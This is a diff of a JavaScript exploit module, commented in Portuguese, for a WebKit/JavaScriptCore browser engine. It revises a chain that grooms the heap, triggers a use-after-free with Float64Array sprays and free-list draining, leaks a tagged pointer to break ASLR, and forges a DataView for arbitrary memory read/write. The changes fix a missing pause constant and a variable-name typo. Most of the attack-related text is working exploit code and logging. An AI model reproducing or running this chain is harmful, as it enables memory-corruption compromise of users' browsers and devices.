@@ -1,11 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v05 - Spray UAF de Mesmo Tipo e Drenagem de Free List)
+// js/script3/testArrayBufferVictimCrash.mjs (v06 - Correção de Constante e Reteste UAF)
 // =======================================================================================
 // ESTA VERSÃO INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
 // 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
 //    - Estratégia de Spray de objetos do MESMO TIPO da vítima (Float64Array para Float64Array).
-//    - Drenagem ativa da free list após a liberação da vítima.
+//    - Drenagem ativa da free list.
 //    - Múltiplas tentativas de UAF.
+//    - CORRIGIDO: ReferenceError para LOCAL_SHORT_SHORT_PAUSE.
 // 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
 // 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
 // 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
@@ -28,13 +29,14 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v05 - Spray UAF de Mesmo Tipo e Drenagem de Free List";
+export const FNAME_MODULE = "v06 - Correção de Constante e Reteste UAF";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
 const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
+const LOCAL_SHORT_SHORT_PAUSE = 50; // Corrigido: Nova constante de pausa para uso na drenagem de free list.
 
 let global_spray_objects = []; // Usado para o spray inicial de heap grooming de alto volume
 let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente (vítimas, sprays UAF, etc.)
@@ -238,14 +240,14 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
 async function triggerGC(logFn, pauseFn) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
     try {
-        for (let i = 0; i < 500; i++) {
+        for (let i = 0; i < 500; i++) { // Aloca 128MB de ArrayBuffer temporário
             new ArrayBuffer(1024 * 256);
         }
     } catch (e) {
         logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
-    for (let i = 0; i < 25; i++) {
+    for (let i = 0; i < 25; i++) { // Aloca 25KB adicionais
         new ArrayBuffer(1024);
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
@@ -261,7 +263,6 @@ async function triggerGC(logFn, pauseFn) {
 async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     let dangling_ref_local = null;
     const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
-    // Este tamanho é um múltiplo de 16 (0x80 / 0x10 = 8), o que pode se alinhar bem aos buckets do bmalloc.
     const SPRAY_COUNT_UAF_OPT = 2000; // Número de objetos no spray UAF
     const SPRAY_OBJECT_DATA_LENGTH = VICTIM_SIZE_BYTES / 8; // Número de doubles para Float64Array (16 doubles para 128 bytes)
 
@@ -310,30 +311,25 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     if (groom_in_hold_index > -1) { hold_objects.splice(groom_in_hold_index, 1); }
     await triggerGC(logFn, pauseFn);
     logFn("    Grooming spray inicial liberado e GC forçado novamente.", "info");
-    await pauseFn(LOCAL_SHORT_SHORT_PAUSE); // Pausa menor aqui para o próximo passo.
+    await pauseFn(LOCAL_SHORT_SHORT_PAUSE); // Pausa menor aqui para o próximo passo. 
 
     // NOVO: Drenagem Ativa da Free List (Hypothesis)
     // Tenta alocar e liberar pequenos grupos de objetos do mesmo tamanho da vítima.
-    // A ideia é que, se o bmalloc tiver uma "quarentena" ou "cache" para blocos liberados,
-    // essa drenagem forçaria o bloco da vítima a sair dessa quarentena e ser reutilizável,
-    // ou "limpar" os blocos antes do spray principal.
-    const DRAIN_COUNT = 50; // Número de "drenagens"
-    const DRAIN_SPRAY_PER_ITERATION = 50; // Quantos objetos alocar/liberar por drenagem
+    const DRAIN_COUNT = 50;
+    const DRAIN_SPRAY_PER_ITERATION = 50;
     logFn(`[UAF] FASE 2.5: Drenagem Ativa da Free List (${DRAIN_COUNT} iterações, ${DRAIN_SPRAY_PER_ITERATION} objetos/iteração)...`, "subtest");
     for (let d = 0; d < DRAIN_COUNT; d++) {
         const drain_objects = [];
         for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
             drain_objects.push(new Float64Array(SPRAY_OBJECT_DATA_LENGTH)); // Aloca Float64Array do mesmo tamanho da vítima
         }
-        // Não adicione drain_objects a hold_objects; eles serão liberados implicitamente ao sair do escopo
-        // ou quando o GC rodar se eles não forem referenciados.
-        // Forçar o GC periodicamente ou confiar na próxima rodada.
-        if (d % 10 === 0) { // Forçar GC a cada 10 iterações para limpar o drain_objects
+        // Não adicione drain_objects a hold_objects; eles serão liberados implicitamente.
+        if (d % 10 === 0) {
              await triggerGC(logFn, pauseFn);
         }
-        await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa entre cada drenagem
+        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
     }
-    await triggerGC(logFn, pauseFn); // Garante que todos os objetos de drenagem sejam coletados
+    await triggerGC(logFn, pauseFn);
     logFn("    Drenagem ativa da Free List concluída.", "info");
     await pauseFn(LOCAL_SHORT_PAUSE);
 
@@ -356,8 +352,6 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag ${toHex(OBJECT_PTR_TAG_HIGH_EXPECTED)} e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
 
     for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
-        // ESSENCIAL: Usar Float64Array diretamente para o spray.
-        // Isso aumenta a probabilidade de reocupar o mesmo "bucket" de memória que o Float64Array vítima.
         const spray_obj = new Float64Array(SPRAY_OBJECT_DATA_LENGTH);
         spray_obj[0] = spray_value_double_to_leak_ptr;
         for (let j = 1; j < spray_obj.length; j++) {
@@ -439,7 +433,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         for (let attempt = 1; attempt <= UAF_ATTEMPTS; attempt++) {
             logFn(`[UAF LEAK] Tentativa ${attempt}/${UAF_ATTEMPTS} para vazamento de ASLR via UAF/TC.`, "subtest");
 
-            // Limpar os objetos hold_objects (que incluem a vítima e o spray do UAF da tentativa anterior)
             hold_objects = [];
             await triggerGC(logFn, pauseFn);
             logFn(`    hold_objects limpos antes da Tentativa UAF #${attempt}.`, "info");
@@ -468,7 +461,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                      uaf_leak_success = true;
                      break;
                 }
-                logFn(`[UAF LEAK] Valor lido inesperado em dangling_ref[0]: ${toHex(leached_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts})`, "warn");
+                logFn(`[UAF LEAK] Valor lido inesperado em dangling_ref[0]: ${toHex(leaked_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts})`, "warn");
                 await pauseFn(LOCAL_VERY_SHORT_PAUSE);
             }
 
